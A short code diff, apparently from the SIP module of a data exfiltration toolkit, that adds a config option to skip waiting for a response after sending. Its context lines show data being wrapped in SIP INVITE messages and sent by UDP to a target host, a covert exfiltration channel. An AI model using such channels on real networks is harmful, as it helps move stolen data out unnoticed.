@@ -246,6 +246,8 @@ def send(data):
     invite = dialog.invite(uac, uas, data)
     app_exfiltrate.log_message('info', "[sip] Sending {0} bytes to {1}".format(len(data), target))
     sock.sendto(invite.pack(), (target, port))
+    if 'dont_wait_response' in config and config['dont_wait_response']:
+        return
     while True:
         try:
             recv_data, addr = sock.recvfrom(65535)
